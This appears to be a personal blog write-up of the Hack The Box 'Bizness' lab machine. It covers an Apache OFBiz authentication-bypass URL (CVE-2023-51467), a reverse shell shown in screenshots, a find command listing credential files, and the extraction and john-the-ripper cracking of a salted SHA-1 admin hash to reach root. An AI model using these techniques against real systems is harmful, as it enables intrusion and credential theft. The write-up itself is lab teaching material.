---
title: Bizness Writeup
date: 2024-02-25 22:00 +0100
author: Kyllano
categories: [HTB Writeup]
tags: [cybersecurity, htb, writeup]
---

## Recon

Let's try to do an nmap first

```
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Software_exploitation/HTB$ nmap -sC -sV -Pn -p-10000 10.10.11.252
Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-25 13:54 CET
Nmap scan report for bizness.htb (10.10.11.252)
Host is up (0.037s latency).
Not shown: 9997 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
80/tcp  open  http     nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to https://bizness.htb/
443/tcp open  ssl/http nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: BizNess Incorporated
|_http-trane-info: Problem with XML parsing of /evox/about
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK
| Not valid before: 2023-12-14T20:03:40
|_Not valid after:  2328-11-10T20:03:40
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.85 seconds
```

As we see, there's nothing really interesting except the usual SSH on port 22 and HTTPS webserver on port 80 and 443. Let's check out the website then

<img src="/assets/img/Bizness/biz1.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Looking at the website, there's nothing much we can directly access (no login page, no forms and such...).

So we turn to our next step of enumeration, which is listing directories, so let's launch dirsearch with only pages that returns a `200:OK` code :

```
(dirsearch_env) kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/dirsearch$ python3 dirsearch.py -u https://bizness.htb/ -i 200

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11718

Output: /home/kyll/Desktop/code_folder/Tools/dirsearch/reports/https_bizness.htb/__24-02-25_18-36-29.txt

Target: https://bizness.htb/

[18:36:29] Starting: 
[18:38:20] 200 -   11KB - /control/login
[18:38:23] 200 -   34KB - /control/
[18:38:23] 200 -   34KB - /control
[18:40:08] 200 -   21B  - /solr/admin/
[18:40:08] 200 -   21B  - /solr/admin/file/?file=solrconfig.xml

Task Completed
```

Aha! That `solr/admin` page does not give us much :

<img src="/assets/img/Bizness/biz2.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

 BUT, that login page is a very good candidate, let's check it out :

<img src="/assets/img/Bizness/biz3.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

I did not manage to do SQL injections, nor to use some common default credentials. But as we can see from the page, this looks like this is using `OFBiz` which will be our target for exploitation

## Exploiting OFBiz

### What is OFBiz?

A quote from the [OFBiz website](https://ofbiz.apache.org/) tells us that 

> **Apache OFBiz** is a suite of business applications flexible enough to be used across any industry. A common architecture allows developers to easily extend or enhance it to create custom features.
> 
> OFBiz is a Java based web framework including an entity engine, a service engine and a widget based UI allowing you to quickly prototype and develop your web application

From this, we get that this is made out of Java, and that it is basically java apache for business. But after one google search, we see that a CVE exists.

### The OFBiz exploit

[This website](https://www.zscaler.fr/blogs/security-research/apache-ofbiz-authentication-bypass-vulnerability-cve-2023-51467) explains it pretty well by saying :

> A threat actor sends an HTTP request to exploit a flaw in the **checkLogin** function. When null or invalid username and password parameters are  supplied and the **requirePasswordChange** parameter is set to **Y** in the URI, the **checkLogin** function fails to validate the credentials, leading to authentication bypass. This occurs because the program flow circumvents the conditional block meant to check the username and password fields. By manipulating login parameters, threat actors can achieve Remote Code Execution (RCE) on a target server.

What that means is that when we visit `https://bizness.htb/webtools/control/ping?USERNAME=&PASSWORD=&requirePasswordChange=Y`, the credentials are not validated and we can run some code as whatever user is running the `OFBiz` webserver. The command will have to be serialized by Java so that it is recognized by `OFBiz` and then it is simply encoded in `base64` and sent out to the server with at the previous address.

### Actually exploiting it

To actually do all of that, we'll use [that](https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass) GitHub repo to do our bidding. Once cloned, we setup a listening netcat on our machine, and we send out a reverse shell as the command that will be remotely executed :

<img src="/assets/img/Bizness/biz4.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And if we look at our listening terminal :

<img src="/assets/img/Bizness/biz4-5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>


We have successfully exploited `OFBiz`, we can now get the `user.txt` flag!

## Privilege escalation

Now that we finally have our foothold, let's try and do some privilege escalation. We do not have `ofbiz`'s password, so it's not useful to check what sudo privileges can give us. So let's try and look for some files that may be useful and that have any of the following patterns (stored in the array `inames`). We then print each elements of the array in a subshell and feed those to the find command as patterns :

```bash
ofbiz@bizness:/opt/ofbiz$ inames=("*.ovpn" ".ssh" "app.js" "id_rsa*" "db_connect" "db_config.php" "database_settings*" "amportal.conf" "tomcat-users.xml" "config.php" "db.php" ".config" "*[Aa]dmin*" "configuration.php" ".secret" ".passwd" "wp-config.php")
ofbiz@bizness:/opt/ofbiz$ find / \( -iname "${inames[0]}" $(printf ' -o -iname %s' "${inames[@]:1}") \) 2> /dev/null
/usr/share/bash-completion/completions/list_admins
/usr/share/bash-completion/completions/mysqladmin
/usr/share/bash-completion/completions/_svnadmin
/opt/ofbiz/applications/accounting/servicedef/services_admin.xml
/opt/ofbiz/applications/accounting/groovyScripts/admin
/opt/ofbiz/applications/accounting/groovyScripts/admin/AcctgAdminServices.groovy
/opt/ofbiz/applications/accounting/minilang/test/AutoAcctgAdminTests.xml
/opt/ofbiz/applications/product/template/product/EditProductQuickAdmin.ftl
/opt/ofbiz/applications/product/groovyScripts/catalog/product/EditProductQuickAdmin.groovy
/opt/ofbiz/framework/start/src/main/java/org/apache/ofbiz/base/start/AdminClient.java
/opt/ofbiz/framework/start/src/main/java/org/apache/ofbiz/base/start/AdminServer.java
/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-PostgreSQL.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Oracle.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-Derby.xml
/opt/ofbiz/framework/resources/templates/AdminNewTenantData-MySQL.xml
/opt/ofbiz/build/classes/java/main/org/apache/ofbiz/solr/webapp/OFBizSolrLoadAdminUiServlet.class
/opt/ofbiz/build/classes/java/main/org/apache/ofbiz/base/start/AdminServer$OfbizSocketCommand.class
/opt/ofbiz/build/classes/java/main/org/apache/ofbiz/base/start/AdminServer$1.class
/opt/ofbiz/build/classes/java/main/org/apache/ofbiz/base/start/AdminServer.class
/opt/ofbiz/build/classes/java/main/org/apache/ofbiz/base/start/AdminClient.class
/opt/ofbiz/plugins/solr/webapp/solr/admin.html
/opt/ofbiz/plugins/solr/webapp/solr/js/scripts/app.js
/opt/ofbiz/plugins/solr/webapp/solr/js/angular/app.js
/opt/ofbiz/plugins/solr/src/main/java/org/apache/ofbiz/solr/webapp/OFBizSolrLoadAdminUiServlet.java
/opt/ofbiz/plugins/solr/home/solrdefault/conf/admin-extra.menu-top.html
/opt/ofbiz/plugins/solr/home/solrdefault/conf/admin-extra.html
/opt/ofbiz/plugins/solr/home/solrdefault/conf/admin-extra.menu-bottom.html
/opt/ofbiz/plugins/lucene/template/AdminSearch.ftl
/proc/sys/vm/admin_reserve_kbytes
```

After carefully searching some of those files, we find that the file the `/opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml` has some interesting content :

```xml
ofbiz@bizness:/opt/ofbiz$ cat /opt/ofbiz/framework/resources/templates/AdminUserLoginData.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
Licensed to the Apache Software Foundation (ASF) under one
or more contributor license agreements.  See the NOTICE file
distributed with this work for additional information
regarding copyright ownership.  The ASF licenses this file
to you under the Apache License, Version 2.0 (the
"License"); you may not use this file except in compliance
with the License.  You may obtain a copy of the License at

http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing,
software distributed under the License is distributed on an
"AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
KIND, either express or implied.  See the License for the
specific language governing permissions and limitations
under the License.
-->

<entity-engine-xml>
    <UserLogin userLoginId="@userLoginId@" currentPassword="{SHA}47ca69ebb4bdc9ae0adec130880165d2cc05db1a" requirePasswordChange="Y"/>
    <UserLoginSecurityGroup groupId="SUPER" userLoginId="@userLoginId@" fromDate="2001-01-01 12:00:00.0"/>
</entity-engine-xml>
```

This gives us a SHA of a password, but upon passing it to john the ripper, I don't find anything. Although this looks like some good find, maybe we should look for some other hashes like this one, so let's search for any file that contains the `SHA` keyword in the `/opt/ofbiz` folder (so in the ofbiz application) that might have not been deleted due to poor configuration (this find command execute grep on each file and returns the name of the file if it found the pattern to grep) :

```bash
ofbiz@bizness:/opt/ofbiz$ find /opt/ofbiz/ -type f -exec grep -q ".*SHA.*" {} \; -print
/opt/ofbiz/applications/accounting/src/main/java/org/apache/ofbiz/accounting/thirdparty/valuelink/ValueLinkApi.java
/opt/ofbiz/applications/datamodel/data/demo/WorkEffortDemoData.xml
/opt/ofbiz/applications/datamodel/data/demo/HumanresDemoData.xml
/opt/ofbiz/applications/datamodel/data/demo/MarketingDemoData.xml
[...]
[...]
/opt/ofbiz/plugins/projectmgr/data/ProjectMgrDemoPasswordData.xml
/opt/ofbiz/.github/workflows/docker-image.yaml
/opt/ofbiz/all-texts.txt

```

Once the command is done, we have a long list, might as well check for some formatted hashes, so let's add a `$` before the hash mimicking the hashes found in the `/etc/shadow` file :

```bash
ofbiz@bizness:/opt/ofbiz$ find /opt/ofbiz/ -type f -exec grep -q ".*\$SHA.*" {} \; -print
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c6650.dat
/opt/ofbiz/runtime/data/derby/ofbiz/seg0/log.txt
/opt/ofbiz/runtime/data/derby/ofbiz/log/log35.dat
/opt/ofbiz/runtime/data/derby/ofbiz/log/log31.dat
/opt/ofbiz/runtime/data/derby/ofbiz/log/log34.dat
/opt/ofbiz/runtime/data/derby/ofbiz/log/log33.dat
/opt/ofbiz/runtime/logs/error.log
/opt/ofbiz/.gradle/5.0-rc-5/javaCompile/classAnalysis.bin
/opt/ofbiz/build/distributions/ofbiz.tar
/opt/ofbiz/gradle/init-gradle-wrapper.sh
/opt/ofbiz/docker/docker-entrypoint.sh

```

upon checking out those files, if we apply the string command to 

the `/opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat` command, we get :

```xml
ofbiz@bizness:/opt/ofbiz$ strings /opt/ofbiz/runtime/data/derby/ofbiz/seg0/c54d0.dat
8501
<?xml version="1.0" encoding="UTF-8"?>
            <ofbiz-ser>
                <map-HashMap>
                    <map-Entry>
                        <map-Key>
                            <std-String value="recurrenceInfoId"/>
                        </map-Key>
                        <map-Value>
                            <std-String value="400"/>
                        </map-Value>
                    </map-Entry>
                </map-HashMap>
            </ofbiz-ser>
        
10000
J<?xml version="1.0" encoding="UTF-8"?><ofbiz-ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <std-String value="updatedUserLogin"/>
            </map-Key>
            <map-Value>
                <eeval-UserLogin createdStamp="2023-12-16 03:40:23.643" createdTxStamp="2023-12-16 03:40:23.445" currentPassword="$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I" enabled="Y" hasLoggedOut="N" lastUpdatedStamp="2023-12-16 03:44:54.272" lastUpdatedTxStamp="2023-12-16 03:44:54.213" requirePasswordChange="N" userLoginId="admin"/>
            </map-Value>
        </map-Entry>
        <map-Entry>
            <map-Key>
                <std-String value="locale"/>
            </map-Key>
            <map-Value>
                <std-Locale value="en"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ofbiz-ser>
```

We found something else that looks like a hash : `SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I`. Let's assume that this is also a SHA-1 (just like the previous hash we found), that means that the salt would be `d` and the hash would be `uP0_QaVBpDWFeo8-dRzDqRwXQ2I`. Exceeeeept... that this do not looks like SHA-1. So it probably means that it was encoded to base64. So let's decode that using our trusty python CLI (also thank you to that [StackOverflow post](https://stackoverflow.com/questions/3302946/how-to-decode-base64-url-in-python)):

```python
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Tools/Apache-OFBiz-Authentication-Bypass$ python3
Python 3.8.10 (default, Nov 22 2023, 10:22:35) 
[GCC 9.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import base64
>>> s = 'uP0_QaVBpDWFeo8-dRzDqRwXQ2I'
>>> base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4))
b'\xb8\xfd?A\xa5A\xa45\x85z\x8f>u\x1c\xc3\xa9\x1c\x17Cb'
>>> base64.urlsafe_b64decode(s + '=' * (4 - len(s) % 4)).hex()
'b8fd3f41a541a435857a8f3e751cc3a91c174362'
```

What this does it add some padding if needed, then decodes base64 and instead of printing `byte` objects, this prints the `hex` version of the bytes, which gives us `b8fd3f41a541a435857a8f3e751cc3a91c174362`. That indeed looks like some SHA-1, let's double check with hashid :

```bash
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Kyllano.github.io$ hashid
b8fd3f41a541a435857a8f3e751cc3a91c174362
Analyzing 'b8fd3f41a541a435857a8f3e751cc3a91c174362'
[+] SHA-1 
[+] Double SHA-1 
[+] RIPEMD-160 
[+] Haval-160 
[+] Tiger-160 
[+] HAS-160 
[+] LinkedIn 
[+] Skein-256(160) 
[+] Skein-512(160) 
```

The 1st result being SHA1, my bet is on SHA1. So let's try and crack this thing up. We know that the salt is `d`, so we need to use some special formats with john the ripper, let's check out the existing subformats that john the ripper propose :

```bash
kyll@kyll-Latitude-3520:~/Desktop/code_folder/Kyllano.github.io$ john --list=subformats
[...]
Format = dynamic_22  type = dynamic_22: md5(sha1($p))
Format = dynamic_23  type = dynamic_23: sha1(md5($p))
Format = dynamic_24  type = dynamic_24: sha1($p.$s)
Format = dynamic_25  type = dynamic_25: sha1($s.$p)
Format = dynamic_41  type = dynamic_41: sha1($s.utf16($p))
Format = dynamic_26  type = dynamic_26: sha1($p) raw-sha1
Format = dynamic_29  type = dynamic_29: md5(utf16($p))
[...]
```

Here are the fomats that uses SHA1. The syntax here is `$p` for candidate password (so from our wordlist) and `$s` for the salt. So we'll use either the subformat `dynamic_24` (taht puts the salt at the end of the hash) or `dynamic_25` (which will put the salt at the front). The syntax in the hash.txt file will need to have the hash and the salt separated by a `$` in the hash file. Let's try and crack it (here out is a renamed `rockyou.txt` only formatted in `UTF-8` and the `lol` file contains the hash formatted accordingly : `b8fd3f41a541a435857a8f3e751cc3a91c174362$d`):

<img src="/assets/img/Bizness/biz5.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

No luck for that one, `dynamic_25` though :

<img src="/assets/img/Bizness/biz6.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

Hell yeah! We have root's password! Let's switch user with our new amazing password :

<img src="/assets/img/Bizness/biz7.png" alt="fuck alt attributes" style="float: left; margin-right: 10px;" width="700"/>

And it seems like we've conquered the world of Bizness!


